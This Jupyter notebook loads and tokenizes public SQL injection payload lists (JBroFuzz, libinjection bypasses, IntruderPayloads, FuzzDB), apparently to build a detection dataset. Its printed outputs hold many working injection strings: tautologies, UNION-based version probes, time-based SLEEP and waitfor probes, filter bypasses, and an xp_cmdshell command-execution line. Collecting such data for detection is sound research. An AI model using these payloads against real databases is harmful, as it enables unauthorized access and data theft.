{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 85,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "import os\n",
    "import nltk \n",
    "from nltk.corpus import stopwords"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Cleaning data function:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "def cleanData(data):\n",
    "    for i in range(len(data)):\n",
    "        data[i]=data[i].replace('\\n', '')\n",
    "        data[i]=data[i].replace('%20', ' ')\n",
    "        data[i]=data[i].replace('=', ' = ')\n",
    "        data[i]=data[i].replace('((', ' (( ')\n",
    "        data[i]=data[i].replace('))', ' )) ')\n",
    "        data[i]=data[i].replace('(', ' ( ')\n",
    "        data[i]=data[i].replace(')', ' ) ')\n",
    "        \n",
    "    return data"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 1) OWASP JBroFuzz"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "1.1) owasp/jbrofuzz\n",
    "\n",
    "source: https://github.com/foospidy/payloads/blob/master/owasp/jbrofuzz/sqli.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./dataset/collected payloads/OWASP/foospidy-sqli.txt'\n",
    "sqliList=[]\n",
    "file= open(path, \"r\") # open file with a mode=r (read only mode\n",
    "for i in file:\n",
    "    sqliList.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['a\\n',\n",
       " \"a' \\n\",\n",
       " \"a' --\\n\",\n",
       " \"a' or 1=1; --\\n\",\n",
       " '@\\n',\n",
       " '?\\n',\n",
       " \"' and 1=0) union all\\n\",\n",
       " '? or 1=1 --\\n',\n",
       " \"x' and userid is NULL; --\\n\",\n",
       " \"x' and email is NULL; --\\n\",\n",
       " \"anything' or 'x'='x\\n\",\n",
       " \"x' and 1=(select count(*) from tabname); --\\n\",\n",
       " \"x' and members.email is NULL; --\\n\",\n",
       " \"x' or full_name like '%bob%\\n\",\n",
       " '23 or 1=1; --\\n',\n",
       " \"'; exec master..xp_cmdshell 'ping 172.10.1.255'--\\n\",\n",
       " 'a\\n',\n",
       " '1 or 1=1\\n',\n",
       " \"1' or '1'='1\\n\",\n",
       " \"1 and user_name() = 'dbo'\\n\"]"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqliList[0:20]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "foospidy_sqli= cleanData(sqliList)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['a',\n",
       " \"a' \",\n",
       " \"a' --\",\n",
       " \"a' or 1 = 1; --\",\n",
       " '@',\n",
       " '?',\n",
       " \"' and 1 = 0 )  union all\",\n",
       " '? or 1 = 1 --',\n",
       " \"x' and userid is NULL; --\",\n",
       " \"x' and email is NULL; --\",\n",
       " \"anything' or 'x' = 'x\",\n",
       " \"x' and 1 =  ( select count ( * )  from tabname ) ; --\",\n",
       " \"x' and members.email is NULL; --\",\n",
       " \"x' or full_name like '%bob%\",\n",
       " '23 or 1 = 1; --',\n",
       " \"'; exec master..xp_cmdshell 'ping 172.10.1.255'--\",\n",
       " 'a',\n",
       " '1 or 1 = 1',\n",
       " \"1' or '1' = '1\",\n",
       " \"1 and user_name (  )   =  'dbo'\"]"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "foospidy_sqli[0:20]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "1.2) libinjection\n",
    "source: https://github.com/foospidy/payloads/blob/master/other/sqli/libinjection-bypasses.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./dataset/collected payloads/OWASP/libinjection-bypasses.txt'\n",
    "sqliList=[]\n",
    "file= open(path, \"r\") # open file with a mode=r (read only mode\n",
    "for i in file:\n",
    "    sqliList.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['&()o1: select * from users where id=1 or (\\\\)=1 union select 1,@@VERSION -- 1\\n',\n",
       " '&(.)o: select * from users where id=1 or (\\\\.)=1 union select 1,@@VERSION -- 1\\n',\n",
       " '&(1&1: select * from users where id=1 or (\\\\+)=1 or 1=1 -- 1\\n',\n",
       " '&(1)o: select * from users where id=1 or (1)=1 union select 1,banner from v$version where rownum=1 -- 1\\n',\n",
       " '&(1UE: select * from users where id=1 or (\\\\+)=1 union select 1,@@VERSION -- 1\\n',\n",
       " '&(n&1: select * from users where id=1 or ($+)=1 or 1=1 -- 1\\n',\n",
       " '&(nUE: select * from users where id=1 or ($+)=1 union select 1,@@VERSION -- 1\\n',\n",
       " '&.o&1: select * from users where id=1 or \\\\.<\\\\ or 1=1 -- 1\\n',\n",
       " '&.o1&: select * from users where id=1 or \\\\.<1 or 1=1 -- 1\\n',\n",
       " '&.o1U: select * from users where id=1 or \\\\.<1 union select 1,@@VERSION -- 1\\n',\n",
       " '&.oUE: select * from users where id=1 or \\\\.<\\\\ union select 1,@@VERSION -- 1\\n',\n",
       " '&.on&: select * from users where id=1 or \\\\.<$ or 1=1 -- 1\\n',\n",
       " '&.onU: select * from users where id=1 or \\\\.<$ union select 1,@@VERSION -- 1\\n',\n",
       " '&.oo1: select * from users where id=1 or \\\\.< =1 union select 1,@@VERSION -- 1\\n',\n",
       " '&1UE1: select * from users where id=1 ||1 union select 1,banner from v$version where rownum=1 -- 1\\n',\n",
       " '&1UEv: select * from users where id=1 ||1 union select null,banner from v$version where rownum=1 -- 1\\n',\n",
       " '&1c: select * from users where id=1   or 1=1 -- 1\\n',\n",
       " '&1oo&: select * from users where id=1 or \\\\+<\\\\ or 1=1 -- 1\\n',\n",
       " '&1oo1: select * from users where id=1 or  1<@=1 union select 1,version() -- 1\\n',\n",
       " '&1ooU: select * from users where id=1 or \\\\+<\\\\ union select 1,@@VERSION -- 1\\n']"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqliList[0:20]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['& (  ) o1: select * from users where id = 1 or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1',\n",
       " '& ( . ) o: select * from users where id = 1 or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1',\n",
       " '& ( 1&1: select * from users where id = 1 or  ( \\\\+ )  = 1 or 1 = 1 -- 1',\n",
       " '& ( 1 ) o: select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " '& ( 1UE: select * from users where id = 1 or  ( \\\\+ )  = 1 union select 1,@@VERSION -- 1',\n",
       " '& ( n&1: select * from users where id = 1 or  ( $+ )  = 1 or 1 = 1 -- 1',\n",
       " '& ( nUE: select * from users where id = 1 or  ( $+ )  = 1 union select 1,@@VERSION -- 1',\n",
       " '&.o&1: select * from users where id = 1 or \\\\.<\\\\ or 1 = 1 -- 1',\n",
       " '&.o1&: select * from users where id = 1 or \\\\.<1 or 1 = 1 -- 1',\n",
       " '&.o1U: select * from users where id = 1 or \\\\.<1 union select 1,@@VERSION -- 1',\n",
       " '&.oUE: select * from users where id = 1 or \\\\.<\\\\ union select 1,@@VERSION -- 1',\n",
       " '&.on&: select * from users where id = 1 or \\\\.<$ or 1 = 1 -- 1',\n",
       " '&.onU: select * from users where id = 1 or \\\\.<$ union select 1,@@VERSION -- 1',\n",
       " '&.oo1: select * from users where id = 1 or \\\\.<  = 1 union select 1,@@VERSION -- 1',\n",
       " '&1UE1: select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " '&1UEv: select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1',\n",
       " '&1c: select * from users where id = 1   or 1 = 1 -- 1',\n",
       " '&1oo&: select * from users where id = 1 or \\\\+<\\\\ or 1 = 1 -- 1',\n",
       " '&1oo1: select * from users where id = 1 or  1<@ = 1 union select 1,version (  )  -- 1',\n",
       " '&1ooU: select * from users where id = 1 or \\\\+<\\\\ union select 1,@@VERSION -- 1']"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "libinjection_sqli= cleanData(sqliList)\n",
    "libinjection_sqli[0:20]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "1.3) camoufl4g3 \n",
    "\n",
    "Source: https://github.com/foospidy/payloads/blob/master/other/sqli/camoufl4g3.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./dataset/collected payloads/OWASP/camoufl4g3.txt'\n",
    "sqliList=[]\n",
    "file= open(path, \"r\") # open file with a mode=r (read only mode\n",
    "for i in file:\n",
    "    sqliList.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'-'\\n\",\n",
       " \"' '\\n\",\n",
       " \"'&'\\n\",\n",
       " \"'^'\\n\",\n",
       " \"'*'\\n\",\n",
       " \"' or ''-'\\n\",\n",
       " \"' or '' '\\n\",\n",
       " \"' or ''&'\\n\",\n",
       " \"' or ''^'\\n\",\n",
       " \"' or ''*'\\n\",\n",
       " '\"-\"\\n',\n",
       " '\" \"\\n',\n",
       " '\"&\"\\n',\n",
       " '\"^\"\\n',\n",
       " '\"*\"\\n',\n",
       " '\" or \"\"-\"\\n',\n",
       " '\" or \"\" \"\\n',\n",
       " '\" or \"\"&\"\\n',\n",
       " '\" or \"\"^\"\\n',\n",
       " '\" or \"\"*\"\\n']"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqliList[0:20]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'-'\",\n",
       " \"' '\",\n",
       " \"'&'\",\n",
       " \"'^'\",\n",
       " \"'*'\",\n",
       " \"' or ''-'\",\n",
       " \"' or '' '\",\n",
       " \"' or ''&'\",\n",
       " \"' or ''^'\",\n",
       " \"' or ''*'\",\n",
       " '\"-\"',\n",
       " '\" \"',\n",
       " '\"&\"',\n",
       " '\"^\"',\n",
       " '\"*\"',\n",
       " '\" or \"\"-\"',\n",
       " '\" or \"\" \"',\n",
       " '\" or \"\"&\"',\n",
       " '\" or \"\"^\"',\n",
       " '\" or \"\"*\"']"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "camoufl4g3_sqli= cleanData(sqliList)\n",
    "camoufl4g3_sqli[0:20]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 2) Kali Linux Burp Suite :"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "2.1) sqli-error-based\n",
    "\n",
    "source: https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/sqli-error-based.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./dataset/collected payloads/kali-linux-burp-suite/sqli-error-based.txt'\n",
    "sqliList=[]\n",
    "file= open(path, \"r\") # open file with a mode=r (read only mode\n",
    "for i in file:\n",
    "    sqliList.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[' OR 1=1\\n',\n",
       " ' OR 1=0\\n',\n",
       " ' OR x=x\\n',\n",
       " ' OR x=y\\n',\n",
       " ' OR 1=1#\\n',\n",
       " ' OR 1=0#\\n',\n",
       " ' OR x=x#\\n',\n",
       " ' OR x=y#\\n',\n",
       " ' OR 1=1-- \\n',\n",
       " ' OR 1=0-- \\n',\n",
       " ' OR x=x-- \\n',\n",
       " ' OR x=y-- \\n',\n",
       " \" OR 3409=3409 AND ('pytW' LIKE 'pytW\\n\",\n",
       " \" OR 3409=3409 AND ('pytW' LIKE 'pytY\\n\",\n",
       " ' HAVING 1=1\\n',\n",
       " ' HAVING 1=0\\n',\n",
       " ' HAVING 1=1#\\n',\n",
       " ' HAVING 1=0#\\n',\n",
       " ' HAVING 1=1-- \\n',\n",
       " ' HAVING 1=0-- \\n']"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqliList[0:20]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[' OR 1 = 1',\n",
       " ' OR 1 = 0',\n",
       " ' OR x = x',\n",
       " ' OR x = y',\n",
       " ' OR 1 = 1#',\n",
       " ' OR 1 = 0#',\n",
       " ' OR x = x#',\n",
       " ' OR x = y#',\n",
       " ' OR 1 = 1-- ',\n",
       " ' OR 1 = 0-- ',\n",
       " ' OR x = x-- ',\n",
       " ' OR x = y-- ',\n",
       " \" OR 3409 = 3409 AND  ( 'pytW' LIKE 'pytW\",\n",
       " \" OR 3409 = 3409 AND  ( 'pytW' LIKE 'pytY\",\n",
       " ' HAVING 1 = 1',\n",
       " ' HAVING 1 = 0',\n",
       " ' HAVING 1 = 1#',\n",
       " ' HAVING 1 = 0#',\n",
       " ' HAVING 1 = 1-- ',\n",
       " ' HAVING 1 = 0-- ']"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "Burp_sqli_error_based= cleanData(sqliList)\n",
    "Burp_sqli_error_based[0:20]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "2.2) sqli-time-based\n",
    "\n",
    "source: https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/sqli-time-based.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./dataset/collected payloads/kali-linux-burp-suite/sqli-time-based.txt'\n",
    "sqliList=[]\n",
    "file= open(path, \"r\") # open file with a mode=r (read only mode\n",
    "for i in file:\n",
    "    sqliList.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\" AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe\\n\",\n",
       " \" AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='\\n\",\n",
       " ' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)\\n',\n",
       " ' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--\\n',\n",
       " ' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#\\n',\n",
       " 'SLEEP(5)#\\n',\n",
       " 'SLEEP(5)-- \\n',\n",
       " 'SLEEP(5)=\"\\n',\n",
       " \"SLEEP(5)='\\n\",\n",
       " ' or SLEEP(5)\\n',\n",
       " ' or SLEEP(5)#\\n',\n",
       " ' or SLEEP(5)--\\n',\n",
       " ' or SLEEP(5)=\"\\n',\n",
       " \" or SLEEP(5)='\\n\",\n",
       " \"waitfor delay '00:00:05'\\n\",\n",
       " \"waitfor delay '00:00:05'-- \\n\",\n",
       " \"waitfor delay '00:00:05'#\\n\",\n",
       " 'benchmark(50000000,MD5(1))\\n',\n",
       " 'benchmark(50000000,MD5(1))-- \\n',\n",
       " 'benchmark(50000000,MD5(1))#\\n']"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqliList[0:20]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\" AND  ( SELECT * FROM  ( SELECT ( SLEEP ( 5  )  )   ) bAKL )  AND 'vRxe' = 'vRxe\",\n",
       " \" AND  ( SELECT * FROM  ( SELECT ( SLEEP ( 5  )  )   ) YjoC )  AND '%' = '\",\n",
       " ' AND  ( SELECT * FROM  ( SELECT ( SLEEP ( 5  )  )   ) nQIP ) ',\n",
       " ' AND  ( SELECT * FROM  ( SELECT ( SLEEP ( 5  )  )   ) nQIP ) --',\n",
       " ' AND  ( SELECT * FROM  ( SELECT ( SLEEP ( 5  )  )   ) nQIP ) #',\n",
       " 'SLEEP ( 5 ) #',\n",
       " 'SLEEP ( 5 ) -- ',\n",
       " 'SLEEP ( 5 )  = \"',\n",
       " \"SLEEP ( 5 )  = '\",\n",
       " ' or SLEEP ( 5 ) ',\n",
       " ' or SLEEP ( 5 ) #',\n",
       " ' or SLEEP ( 5 ) --',\n",
       " ' or SLEEP ( 5 )  = \"',\n",
       " \" or SLEEP ( 5 )  = '\",\n",
       " \"waitfor delay '00:00:05'\",\n",
       " \"waitfor delay '00:00:05'-- \",\n",
       " \"waitfor delay '00:00:05'#\",\n",
       " 'benchmark ( 50000000,MD5 ( 1  )  )  ',\n",
       " 'benchmark ( 50000000,MD5 ( 1  )  )  -- ',\n",
       " 'benchmark ( 50000000,MD5 ( 1  )  )  #']"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "Burp_sqli_time_based= cleanData(sqliList)\n",
    "Burp_sqli_time_based[0:20]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "2.3) sqli-union-select\n",
    "\n",
    "source: https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/sqli-union-select.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./dataset/collected payloads/kali-linux-burp-suite/sqli-union-select.txt'\n",
    "sqliList=[]\n",
    "file= open(path, \"r\") # open file with a mode=r (read only mode\n",
    "for i in file:\n",
    "    sqliList.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[' ORDER BY SLEEP(5)\\n',\n",
       " ' ORDER BY 1,SLEEP(5)\\n',\n",
       " \" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))\\n\",\n",
       " \" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4\\n\",\n",
       " \" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5\\n\",\n",
       " \" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6\\n\",\n",
       " \" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7\\n\",\n",
       " \" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8\\n\",\n",
       " \" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9\\n\",\n",
       " \" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10\\n\",\n",
       " \" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11\\n\",\n",
       " \" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12\\n\",\n",
       " \" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13\\n\",\n",
       " \" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14\\n\",\n",
       " \" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14\\n\",\n",
       " \" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15\\n\",\n",
       " \" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16\\n\",\n",
       " \" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17\\n\",\n",
       " \" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\\n\",\n",
       " \" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\\n\"]"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqliList[0:20]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[' ORDER BY SLEEP ( 5 ) ',\n",
       " ' ORDER BY 1,SLEEP ( 5 ) ',\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  \",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\",\n",
       " \" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\"]"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "Burp_sqli_union_select= cleanData(sqliList)\n",
    "Burp_sqli_union_select[0:20]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "2.4) sqli-escape-chars\n",
    "\n",
    "source: https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/sqli_escape_chars.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./dataset/collected payloads/kali-linux-burp-suite/sqli_escape_chars.txt'\n",
    "sqliList=[]\n",
    "file= open(path, \"r\") # open file with a mode=r (read only mode\n",
    "for i in file:\n",
    "    sqliList.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'\\n\",\n",
       " '\"\\n',\n",
       " \"''\\n\",\n",
       " '\\'\"\\n',\n",
       " ';\\n',\n",
       " '\\n',\n",
       " ')\\n',\n",
       " \"')\\n\",\n",
       " '\")\\n',\n",
       " '\");\\n',\n",
       " \"';\\n\",\n",
       " '\";\\n',\n",
       " \"%'\\n\",\n",
       " '%\"\\n',\n",
       " \"%')\\n\",\n",
       " '%\")\\n',\n",
       " \"'))\\n\",\n",
       " '\"))\\n',\n",
       " '\")))\\n',\n",
       " '\\n']"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqliList[0:20]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'\",\n",
       " '\"',\n",
       " \"''\",\n",
       " '\\'\"',\n",
       " ';',\n",
       " '',\n",
       " ' ) ',\n",
       " \"' ) \",\n",
       " '\" ) ',\n",
       " '\" ) ;',\n",
       " \"';\",\n",
       " '\";',\n",
       " \"%'\",\n",
       " '%\"',\n",
       " \"%' ) \",\n",
       " '%\" ) ',\n",
       " \"'  )  )  \",\n",
       " '\"  )  )  ',\n",
       " '\"  )  )   ) ',\n",
       " '']"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "Burp_sqli_escape_chars= cleanData(sqliList)\n",
    "Burp_sqli_escape_chars[0:20]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 3) FuzzDB :"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "3.1) GenericBlind\n",
    "\n",
    "source: https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/sql-injection/detect/GenericBlind.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./dataset/collected payloads/FuzzDB/GenericBlind.txt'\n",
    "sqliList=[]\n",
    "file= open(path, \"r\") # open file with a mode=r (read only mode\n",
    "for i in file:\n",
    "    sqliList.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['sleep(__TIME__)#\\n',\n",
       " '1 or sleep(__TIME__)#\\n',\n",
       " '\" or sleep(__TIME__)#\\n',\n",
       " \"' or sleep(__TIME__)#\\n\",\n",
       " '\" or sleep(__TIME__)=\"\\n',\n",
       " \"' or sleep(__TIME__)='\\n\",\n",
       " '1) or sleep(__TIME__)#\\n',\n",
       " '\") or sleep(__TIME__)=\"\\n',\n",
       " \"') or sleep(__TIME__)='\\n\",\n",
       " '1)) or sleep(__TIME__)#\\n',\n",
       " '\")) or sleep(__TIME__)=\"\\n',\n",
       " \"')) or sleep(__TIME__)='\\n\",\n",
       " \";waitfor delay '0:0:__TIME__'--\\n\",\n",
       " \");waitfor delay '0:0:__TIME__'--\\n\",\n",
       " \"';waitfor delay '0:0:__TIME__'--\\n\",\n",
       " '\";waitfor delay \\'0:0:__TIME__\\'--\\n',\n",
       " \"');waitfor delay '0:0:__TIME__'--\\n\",\n",
       " '\");waitfor delay \\'0:0:__TIME__\\'--\\n',\n",
       " \"));waitfor delay '0:0:__TIME__'--\\n\",\n",
       " \"'));waitfor delay '0:0:__TIME__'--\\n\"]"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqliList[0:20]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['sleep ( __TIME__ ) #',\n",
       " '1 or sleep ( __TIME__ ) #',\n",
       " '\" or sleep ( __TIME__ ) #',\n",
       " \"' or sleep ( __TIME__ ) #\",\n",
       " '\" or sleep ( __TIME__ )  = \"',\n",
       " \"' or sleep ( __TIME__ )  = '\",\n",
       " '1 )  or sleep ( __TIME__ ) #',\n",
       " '\" )  or sleep ( __TIME__ )  = \"',\n",
       " \"' )  or sleep ( __TIME__ )  = '\",\n",
       " '1  )  )   or sleep ( __TIME__ ) #',\n",
       " '\"  )  )   or sleep ( __TIME__ )  = \"',\n",
       " \"'  )  )   or sleep ( __TIME__ )  = '\",\n",
       " \";waitfor delay '0:0:__TIME__'--\",\n",
       " \" ) ;waitfor delay '0:0:__TIME__'--\",\n",
       " \"';waitfor delay '0:0:__TIME__'--\",\n",
       " '\";waitfor delay \\'0:0:__TIME__\\'--',\n",
       " \"' ) ;waitfor delay '0:0:__TIME__'--\",\n",
       " '\" ) ;waitfor delay \\'0:0:__TIME__\\'--',\n",
